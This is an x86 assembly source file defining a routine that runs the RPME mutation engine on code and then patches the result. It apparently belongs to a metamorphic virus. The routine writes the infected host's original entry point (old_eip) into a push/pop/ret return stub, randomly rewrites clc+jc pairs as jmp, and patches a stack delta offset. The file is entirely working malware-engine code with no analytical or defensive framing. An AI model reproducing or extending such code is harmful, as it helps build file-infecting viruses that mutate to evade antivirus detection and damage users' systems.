
; subroutine: my_mutate()
; action:
; 1. call standard RPME's mutator
; 2. find get_old_eip subroutine, and insert old_eip there

my_mutate               proc    pascal
                        arg     _root
                        arg     _rnd
                        arg     _malloc
                        pusha
                        cld

                        ;;
                        push    _malloc
                        push    _rnd
                        push    _root
                        call    mutate ;rpme-mut.inc (call std rpme's mutate)
                        ;;

                        mov     usermut_complete, 0

                        mov     ebx, _root

        IFDEF   DEBUG
        ; calculate summary code size
                        pusha
                        xor     ecx, ecx
__ccc:                  add     ecx, [ebx].h_len
                        mov     ebx, [ebx].h_next
                        or      ebx, ebx
                        jnz     __ccc
                        debugmsg codelen, ecx
                        popa
        ENDIF ; DEBUG


                        xor     edi, edi        ; # of downgrades
__cycle:

; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

__cycle1:               cmp     [ebx].h_opcode, 68h ; push nnnn
                        jne     __skip1

                        mov     ecx, ebx
__x1:                   mov     ecx, [ecx].h_nxt ; nxt/next -- no difference
                        or      ecx, ecx
                        jz      __skip1
                        cmp     [ecx].h_opcode, 0E9h
                        je      __x1
                        cmp     [ecx].h_opcode, 58h ; pop eax
                        jne     __skip1

                        mov     edx, ecx
__x2:                   mov     edx, [edx].h_nxt
                        or      edx, edx
                        jz      __skip1
                        cmp     [edx].h_opcode, 0E9h
                        je      __x2
                        cmp     [edx].h_opcode, 0C3h ; ret
                        jne     __skip1

                        mov     eax, old_eip
                        mov     [ebx].h_opcode.dword ptr 1, eax

                        add     usermut_complete, 100

                        jmp     __continue
__skip1:

; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

                        or      edi, edi      ; only 1 downgrade per mutation
                        jnz     __skip2

                        mov     edx, [ebx].h_nxt   ; process only contiguous
                        cmp     edx, [ebx].h_next  ; opcodes
                        jne     __skip2
                        or      edx, edx
                        jz      __skip2
                        cmp     [edx].h_opcode, 0F8h ; clc
                        jne     __skip2

                        mov     esi, [edx].h_nxt   ; --//--
                        cmp     esi, [edx].h_next
                        jne     __skip2
                        or      esi, esi
                        jz      __skip2
                        cmp     word ptr [esi].h_opcode, 820Fh  ; jc
                        jne     __skip2

                        rnd     30      ; downgrade probability
                        jnz     __skip2
                        if_first __skip2

                        debugmsg downgrade

                        mov     [ebx].h_nxt,  esi       ; remove CLC
                        mov     [ebx].h_next, esi

                        mov     [esi].h_opcode, 0E9h    ; jc --> jmp
                        mov     [esi].h_len, 1+4
                        xor     eax, eax
                        mov     [esi].h_nxt, eax
                        or      [esi].h_flags, CM_STOP

                        inc     edi  ; # of downgrades

                        jmp     __continue
__skip2:
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

                        mov     eax, dword ptr [ebx].h_opcode
                        shl     eax, 8
                        cmp     eax, 24AC8D00h ; lea ebp, [esp+nnnn]
                        jne     __skip3

                        mov     eax, delta_esp
                        mov     [ebx].h_opcode.dword ptr 3, eax

                        add     usermut_complete, 1

                        jmp     __continue
__skip3:
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

__continue:             mov     ebx, [ebx].h_next
                        or      ebx, ebx
                        jnz     __cycle

                        popa
                        ret

                        endp ; my_mutate

